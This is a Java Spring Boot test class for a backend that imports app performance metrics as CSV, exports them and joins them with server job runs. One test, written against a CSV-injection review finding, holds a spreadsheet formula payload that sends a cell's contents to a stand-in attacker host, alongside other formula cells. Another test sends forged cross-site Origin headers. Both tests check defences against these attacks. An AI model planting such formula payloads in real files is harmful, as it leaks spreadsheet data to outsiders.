package com.example.mockbackend;

import com.example.mockbackend.domain.Job;
import com.example.mockbackend.domain.JobRun;
import com.example.mockbackend.domain.JobStatus;
import com.example.mockbackend.domain.RunDetails;
import com.example.mockbackend.domain.StoredUpload;
import com.example.mockbackend.repository.ClientMetricRepository;
import com.example.mockbackend.repository.JobRunRepository;
import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.autoconfigure.web.servlet.AutoConfigureMockMvc;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.http.MediaType;
import org.springframework.mock.web.MockMultipartFile;
import org.springframework.test.web.servlet.MockMvc;
import org.springframework.test.web.servlet.MvcResult;
import org.springframework.test.web.servlet.request.MockHttpServletRequestBuilder;
import org.springframework.test.web.servlet.request.MockMultipartHttpServletRequestBuilder;

import java.nio.charset.StandardCharsets;
import java.time.Instant;
import java.util.ArrayList;
import java.util.List;

import static org.assertj.core.api.Assertions.assertThat;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.multipart;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.content;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.header;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.jsonPath;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;

/**
 * App measurements (docs/METRICS.md §3·§3.1): the metrics.csv the Unity app writes on the phone (MetricsRecorder) is
 * uploaded by a team member, stored per line, and joined with the server's job_runs by jobId.
 */
@SpringBootTest
@AutoConfigureMockMvc
class ClientMetricsApiTest {
    /** docs/METRICS.md §3 — also MetricsRecorder.Header in the Unity app. */
    private static final String HEADER = "jobId,uploadMs,waitMs,downloadMs,loadMs,e2eMs,avgFps,minFps,memMB,device";
    /** docs/METRICS.md §3.1, written out on purpose. */
    private static final List<String> E2E_COLUMNS = List.of(
            "jobId", "modelVersion", "workerType", "passthrough", "attempt", "finishedAt",
            "uploadBytes", "serverUploadMs", "queuedMs", "processingMs", "totalMs",
            "inferMs", "gpuPeakMB", "modelParams", "outputVertices", "outputTriangles", "convertMs", "glbBytes",
            "uploadMs", "waitMs", "downloadMs", "loadMs", "e2eMs", "avgFps", "minFps", "memMB", "device");
    private static final Instant T0 = Instant.parse("2026-11-12T00:00:00Z");
    private static final String JOB_A = "aaaaaaaa-0000-4000-8000-000000000001";
    private static final String JOB_B = "bbbbbbbb-0000-4000-8000-000000000002";
    private static final String JOB_C = "cccccccc-0000-4000-8000-000000000003";

    @Autowired
    MockMvc mvc;

    @Autowired
    ObjectMapper objectMapper;

    @Autowired
    JobRunRepository runs;

    @Autowired
    ClientMetricRepository clientMetrics;

    @BeforeEach
    void clean() {
        clientMetrics.deleteAll();
        runs.deleteAll();
    }

    @Test
    void importsTheFileAsTheAppWritesItAndExportsTheSameColumns() throws Exception {
        // MetricsRecorder.Append: LF line ends, fps with one decimal (InvariantCulture), device always quoted.
        String file = HEADER + "\n"
                + JOB_A + ",812,6120,240,180,7480,58.3,41.0,412,\"Pixel 7\"\n"
                + JOB_B + ",900,7000,300,200,8500,30.0,12.5,380,\"SM-S911N, \"\"Galaxy\"\"\"\n";
        JsonNode result = json(mvc.perform(upload(file)).andExpect(status().isOk()).andReturn());
        assertThat(result.path("imported").asInt()).isEqualTo(2);
        assertThat(result.path("skipped").asInt()).isZero();
        assertThat(result.path("errors")).isEmpty();

        JsonNode rows = json(mvc.perform(get("/api/v1/admin/client-metrics"))
                .andExpect(status().isOk())
                .andExpect(content().contentTypeCompatibleWith(MediaType.APPLICATION_JSON))
                .andReturn());
        assertThat(rows).hasSize(2);
        assertThat(fieldNames(rows.get(0))).as("JSON names = METRICS §3 header").containsExactly(HEADER.split(","));
        JsonNode a = rows.get(0);
        assertThat(a.path("jobId").asText()).isEqualTo(JOB_A);
        assertThat(a.path("uploadMs").asLong()).isEqualTo(812);
        assertThat(a.path("e2eMs").asLong()).isEqualTo(7480);
        assertThat(a.path("avgFps").asDouble()).isEqualTo(58.3);
        assertThat(a.path("minFps").asDouble()).isEqualTo(41.0);
        assertThat(a.path("memMB").asLong()).isEqualTo(412);
        assertThat(a.path("device").asText()).isEqualTo("Pixel 7");
        assertThat(rows.get(1).path("device").asText()).isEqualTo("SM-S911N, \"Galaxy\"");

        MvcResult csv = mvc.perform(get("/api/v1/admin/client-metrics").param("format", "csv"))
                .andExpect(status().isOk())
                .andExpect(header().string("Content-Disposition", "attachment; filename=\"client_metrics.csv\""))
                .andReturn();
        assertThat(csv.getResponse().getContentAsString(StandardCharsets.UTF_8)).isEqualTo(HEADER + "\r\n"
                + JOB_A + ",812,6120,240,180,7480,58.3,41.0,412,Pixel 7\r\n"
                + JOB_B + ",900,7000,300,200,8500,30.0,12.5,380,\"SM-S911N, \"\"Galaxy\"\"\"\r\n");

        // A BOM and CRLF line ends (a file saved again on Windows) are fine.
        String windows = "﻿" + HEADER + "\r\n" + JOB_C + ",1,2,3,4,10,60,59.9,100,\r\n";
        JsonNode second = json(mvc.perform(upload(windows)).andExpect(status().isOk()).andReturn());
        assertThat(second.path("imported").asInt()).isEqualTo(1);
        JsonNode c = json(mvc.perform(get("/api/v1/admin/client-metrics")).andReturn()).get(2);
        assertThat(c.path("device").isNull()).as("an empty device cell is null").isTrue();
        assertThat(c.path("avgFps").asDouble()).isEqualTo(60.0);
    }

    @Test
    void theSameJobDeviceAndE2eMsIsImportedOnce() throws Exception {
        String file = HEADER + "\n"
                + JOB_A + ",812,6120,240,180,7480,58.3,41.0,412,\"Pixel 7\"\n"
                + JOB_A + ",812,6120,240,180,7480,58.3,41.0,412,\"Pixel 7\"\n"   // same line twice in one file
                + JOB_A + ",700,6000,200,150,7100,57.0,40.0,410,\"Pixel 7\"\n"   // the same job measured again
                + JOB_A + ",812,6120,240,180,7480,50.0,30.0,500,\"Pixel 8\"\n";  // another phone
        JsonNode first = json(mvc.perform(upload(file)).andExpect(status().isOk()).andReturn());
        assertThat(first.path("imported").asInt()).isEqualTo(3);
        assertThat(first.path("skipped").asInt()).isEqualTo(1);

        JsonNode again = json(mvc.perform(upload(file)).andExpect(status().isOk()).andReturn());
        assertThat(again.path("imported").asInt()).as("uploading the same file twice adds nothing").isZero();
        assertThat(again.path("skipped").asInt()).isEqualTo(4);
        assertThat(clientMetrics.count()).isEqualTo(3);

        // The exported CSV can be uploaded again: every line is a duplicate.
        String exported = mvc.perform(get("/api/v1/admin/client-metrics").param("format", "csv"))
                .andReturn().getResponse().getContentAsString(StandardCharsets.UTF_8);
        JsonNode roundTrip = json(mvc.perform(upload(exported)).andExpect(status().isOk()).andReturn());
        assertThat(roundTrip.path("imported").asInt()).isZero();
        assertThat(roundTrip.path("skipped").asInt()).isEqualTo(3);
    }

    /**
     * Review finding 2026-11-21 (CSV injection): a text cell that a spreadsheet would run as a formula is exported with a
     * leading apostrophe, the exported file still imports as duplicates, and a jobId that is not a UUID is refused.
     */
    @Test
    void formulaLikeCellsAreExportedAsTextAndJobIdsMustBeUuids() throws Exception {
        String formula = "=HYPERLINK(\"https://evil.example/?\"&A2,\"x\")";
        String file = HEADER + "\n"
                + JOB_A + ",812,6120,240,180,7480,58.3,41.0,412,\"" + formula.replace("\"", "\"\"") + "\"\n"
                + JOB_B + ",812,6120,240,180,7480,58.3,41.0,412,@SUM(1)\n"
                + "=1+2,812,6120,240,180,7480,58.3,41.0,412,\"Pixel 7\"\n"          // line 4: not a job id
                + "not-a-uuid,812,6120,240,180,7480,58.3,41.0,412,\"Pixel 7\"\n";   // line 5
        JsonNode result = json(mvc.perform(upload(file)).andExpect(status().isOk()).andReturn());
        assertThat(result.path("imported").asInt()).isEqualTo(2);
        List<Integer> lines = new ArrayList<>();
        result.path("errors").forEach(error -> {
            lines.add(error.path("line").asInt());
            assertThat(error.path("reason").asText()).contains("jobId");
        });
        assertThat(lines).containsExactly(4, 5);
        assertThat(json(mvc.perform(get("/api/v1/admin/client-metrics")).andReturn()).get(0).path("device").asText())
                .as("stored as sent").isEqualTo(formula);

        String exported = mvc.perform(get("/api/v1/admin/client-metrics").param("format", "csv"))
                .andReturn().getResponse().getContentAsString(StandardCharsets.UTF_8);
        assertThat(exported).contains(",\"'" + formula.replace("\"", "\"\"") + "\"\r\n").contains(",'@SUM(1)\r\n");
        for (String line : exported.split("\r\n")) {
            for (String cell : line.split(",")) {
                assertThat(cell).as("no cell starts like a formula").doesNotStartWith("=").doesNotStartWith("@")
                        .doesNotStartWith("+");
            }
        }
        JsonNode roundTrip = json(mvc.perform(upload(exported)).andExpect(status().isOk()).andReturn());
        assertThat(roundTrip.path("imported").asInt()).as("the guarded export reads back as the same lines").isZero();
        assertThat(roundTrip.path("skipped").asInt()).isEqualTo(2);
    }

    /**
     * Review finding 2026-11-21: the import is a form POST, which a page on another site can submit with the team's
     * cached Basic credentials. CrossSiteWriteFilter refuses v1 writes whose Sec-Fetch-Site or Origin names another
     * site; the app and tools (no such header) and our own pages (same-origin) pass, and reads are never refused.
     */
    @Test
    void writesFromAPageOfAnotherSiteAreRefused() throws Exception {
        String file = HEADER + "\n" + JOB_A + ",812,6120,240,180,7480,58.3,41.0,412,\"Pixel 7\"\n";
        List<MockHttpServletRequestBuilder> crossSite = List.of(
                upload(file).header("Sec-Fetch-Site", "cross-site"),
                upload(file).header("Sec-Fetch-Site", "same-site"),
                upload(file).header("Origin", "https://evil.example"),
                upload(file).header("Origin", "null"),
                upload(file).header("Origin", "http://localhost:8081"));
        for (MockHttpServletRequestBuilder request : crossSite) {
            mvc.perform(request)
                    .andExpect(status().isBadRequest())
                    .andExpect(jsonPath("$.error.code").value("INVALID_REQUEST"));
        }
        assertThat(clientMetrics.count()).as("nothing stored").isZero();
        mvc.perform(get("/api/v1/admin/client-metrics").header("Sec-Fetch-Site", "cross-site")).andExpect(status().isOk());

        mvc.perform(upload(file).header("Sec-Fetch-Site", "same-origin").header("Origin", "http://localhost"))
                .andExpect(status().isOk());
        mvc.perform(upload(file).header("Origin", "http://localhost")).andExpect(status().isOk()); // older browser, same host
        mvc.perform(upload(file)).andExpect(status().isOk()); // not a browser
        assertThat(clientMetrics.count()).isEqualTo(1);
    }

    @Test
    void aHeaderThatIsNotExactlyTheMetricsHeaderIsRejected() throws Exception {
        String row = JOB_A + ",812,6120,240,180,7480,58.3,41.0,412,\"Pixel 7\"\n";
        List<String> files = List.of(
                "jobId,uploadMs,waitMs,downloadMs,loadMs,e2eMs,avgFps,minFps,memMB\n" + row,                 // missing device
                "jobId,waitMs,uploadMs,downloadMs,loadMs,e2eMs,avgFps,minFps,memMB,device\n" + row,           // order
                HEADER + ",extra\n" + row,
                HEADER.toLowerCase() + "\n" + row,
                " " + HEADER + "\n" + row,
                row,                                                                                          // no header
                "",
                "\n\n");
        for (String file : files) {
            assertInvalid(upload(file));
        }
        assertInvalid(multipart("/api/v1/admin/client-metrics"));                                           // no file part
        assertInvalid(multipart("/api/v1/admin/client-metrics")
                .file(new MockMultipartFile("other", "metrics.csv", "text/csv", (HEADER + "\n" + row).getBytes(StandardCharsets.UTF_8))));
        assertThat(clientMetrics.count()).as("nothing stored").isZero();
    }

    @Test
    void badLinesAreReportedByLineNumberAndTheRestIsImported() throws Exception {
        String file = HEADER + "\n"                                                       // line 1
                + JOB_A + ",812,6120,240,180,7480,58.3,41.0,412,\"Pixel 7\"\n"           // 2 ok
                + JOB_A + ",812,6120,240,180,7481,abc,41.0,412,\"Pixel 7\"\n"            // 3 avgFps not a number
                + JOB_A + ",12.5,6120,240,180,7482,58.3,41.0,412,\"Pixel 7\"\n"          // 4 uploadMs not an integer
                + JOB_A + ",812,6120,240,180,7483,58.3,41.0,-1,\"Pixel 7\"\n"            // 5 memMB negative
                + JOB_A + ",812,6120,240,180,7484\n"                                     // 6 too few cells
                + ",812,6120,240,180,7485,58.3,41.0,412,\"Pixel 7\"\n"                   // 7 no jobId
                + "\n"                                                                   // 8 blank: ignored
                + JOB_B + ",812,6120,240,180,,58.3,41.0,412,\"Pixel 7\"\n"               // 9 e2eMs empty
                + JOB_B + ",1,2,3,4,5,NaN,1.0,1,\"x\"\n"                                 // 10 NaN is not a number here
                + JOB_B + ",900,7000,300,200,8500,30.0,12.5,380,\"Pixel 7\"\n";          // 11 ok
        JsonNode result = json(mvc.perform(upload(file)).andExpect(status().isOk()).andReturn());
        assertThat(result.path("imported").asInt()).isEqualTo(2);
        assertThat(result.path("skipped").asInt()).isZero();
        List<Integer> lines = new ArrayList<>();
        List<String> reasons = new ArrayList<>();
        result.path("errors").forEach(error -> {
            lines.add(error.path("line").asInt());
            reasons.add(error.path("reason").asText());
        });
        assertThat(lines).containsExactly(3, 4, 5, 6, 7, 9, 10);
        assertThat(reasons.get(0)).contains("avgFps");
        assertThat(reasons.get(1)).contains("uploadMs");
        assertThat(reasons.get(2)).contains("memMB");
        assertThat(reasons.get(3)).contains("10");
        assertThat(reasons.get(4)).contains("jobId");
        assertThat(reasons.get(5)).contains("e2eMs");
        assertThat(reasons.get(6)).contains("avgFps");
        assertThat(clientMetrics.count()).isEqualTo(2);
    }

    @Test
    void e2eJoinsTheLastCompletedRunOfEachJob() throws Exception {
        run(JOB_A, 1, "real", "INFERENCE_TIMEOUT", T0.plusSeconds(10), RunDetails.NONE);
        run(JOB_A, 2, "real", null, T0.plusSeconds(100),
                new RunDetails(48210L, 9120L, 312_000_000L, 10342L, 19876L, 850L, 5_242_880L, false, "animallift-baseline@abc"));
        run(JOB_B, 1, "real", null, T0.plusSeconds(200), new RunDetails(5L, 1L, null, null, null, null, 100L, true, "sample"));
        String file = HEADER + "\n"
                + JOB_A + ",812,6120,240,180,7480,58.3,41.0,412,\"Pixel 7\"\n"
                + JOB_B + ",900,7000,300,200,8500,30.0,12.5,380,\"Pixel 7\"\n"
                + JOB_C + ",1,2,3,4,10,60.0,59.9,100,\"Pixel 7\"\n";
        mvc.perform(upload(file)).andExpect(status().isOk()).andExpect(jsonPath("$.imported").value(3));

        JsonNode rows = json(mvc.perform(get("/api/v1/admin/e2e")).andExpect(status().isOk()).andReturn());
        assertThat(rows).as("B ran in passthrough: left out by default").hasSize(2);
        assertThat(fieldNames(rows.get(0))).as("JSON names = CSV header").containsExactlyElementsOf(E2E_COLUMNS);
        JsonNode a = rows.get(0);
        assertThat(a.path("jobId").asText()).isEqualTo(JOB_A);
        assertThat(a.path("attempt").asInt()).as("the COMPLETED attempt").isEqualTo(2);
        assertThat(a.path("modelVersion").asText()).isEqualTo("animallift-baseline@abc");
        assertThat(a.path("serverUploadMs").asLong()).as("server uploadMs").isEqualTo(12);
        assertThat(a.path("uploadMs").asLong()).as("app uploadMs").isEqualTo(812);
        assertThat(a.path("inferMs").asLong()).isEqualTo(48210);
        assertThat(a.path("e2eMs").asLong()).isEqualTo(7480);
        JsonNode c = rows.get(1);
        assertThat(c.path("jobId").asText()).isEqualTo(JOB_C);
        assertThat(c.path("attempt").isNull()).as("no run on this server").isTrue();
        assertThat(c.path("serverUploadMs").isNull()).isTrue();
        assertThat(c.path("e2eMs").asLong()).isEqualTo(10);

        MvcResult csv = mvc.perform(get("/api/v1/admin/e2e").param("format", "csv"))
                .andExpect(status().isOk())
                .andExpect(header().string("Content-Disposition", "attachment; filename=\"e2e.csv\""))
                .andReturn();
        String[] lines = csv.getResponse().getContentAsString(StandardCharsets.UTF_8).split("\r\n", -1);
        assertThat(lines[0]).isEqualTo(String.join(",", E2E_COLUMNS));
        // queuedMs 1000, processingMs 4000 and totalMs 5000 come from the helper's fixed stage times.
        assertThat(lines[1]).isEqualTo(JOB_A + ",animallift-baseline@abc,real,false,2,2026-11-12T00:01:40Z,2048,12,1000,4000,5000,"
                + "48210,9120,312000000,10342,19876,850,5242880,812,6120,240,180,7480,58.3,41.0,412,Pixel 7");
        // jobId, then the 17 empty server and inference cells, then the app cells.
        assertThat(lines[2]).isEqualTo(JOB_C + ",".repeat(18) + "1,2,3,4,10,60.0,59.9,100,Pixel 7");
        assertThat(lines).hasSize(4);

        JsonNode all = json(mvc.perform(get("/api/v1/admin/e2e").param("includePassthrough", "true"))
                .andExpect(status().isOk()).andReturn());
        assertThat(all).extracting(row -> row.path("jobId").asText()).containsExactly(JOB_A, JOB_B, JOB_C);
    }

    @Test
    void invalidExportParametersAreInvalidRequest() throws Exception {
        assertInvalid(get("/api/v1/admin/client-metrics").param("format", "xml"));
        assertInvalid(get("/api/v1/admin/e2e").param("format", "tsv"));
        assertInvalid(get("/api/v1/admin/e2e").param("includePassthrough", "maybe"));
    }

    // ------------------------------------------------------------------ helpers

    private static MockMultipartHttpServletRequestBuilder upload(String csv) {
        return multipart("/api/v1/admin/client-metrics")
                .file(new MockMultipartFile("file", "metrics.csv", "text/csv", csv.getBytes(StandardCharsets.UTF_8)));
    }

    private void assertInvalid(MockHttpServletRequestBuilder request) throws Exception {
        mvc.perform(request)
                .andExpect(status().isBadRequest())
                .andExpect(content().contentTypeCompatibleWith(MediaType.APPLICATION_JSON))
                .andExpect(jsonPath("$.error.code").value("INVALID_REQUEST"))
                .andExpect(jsonPath("$.error.message").isNotEmpty());
    }

    /** One finished run ending at {@code finishedAt} with queuedMs 1000, processingMs 4000, totalMs 5000, uploadMs 12. */
    private void run(String jobId, int attempt, String workerType, String errorCode, Instant finishedAt, RunDetails details) {
        Instant queuedAt = finishedAt.minusSeconds(5);
        Job job = new Job();
        job.setId(jobId);
        job.setStatus(errorCode == null ? JobStatus.COMPLETED : JobStatus.FAILED);
        job.setErrorCode(errorCode);
        job.setCreatedAt(queuedAt);
        job.setQueuedAt(queuedAt);
        job.setProcessingStartedAt(queuedAt.plusSeconds(1));
        job.setFinishedAt(finishedAt);
        job.setAttempt(attempt);
        job.setUploadMs(12L);
        job.setUploads(List.of(new StoredUpload("dog.jpg", 2048, "not-exposed/dog.jpg")));
        runs.saveAndFlush(JobRun.of(job, finishedAt, workerType, details));
    }

    private static List<String> fieldNames(JsonNode node) {
        List<String> names = new ArrayList<>();
        node.fieldNames().forEachRemaining(names::add);
        return names;
    }

    private JsonNode json(MvcResult result) throws Exception {
        return objectMapper.readTree(result.getResponse().getContentAsByteArray());
    }
}
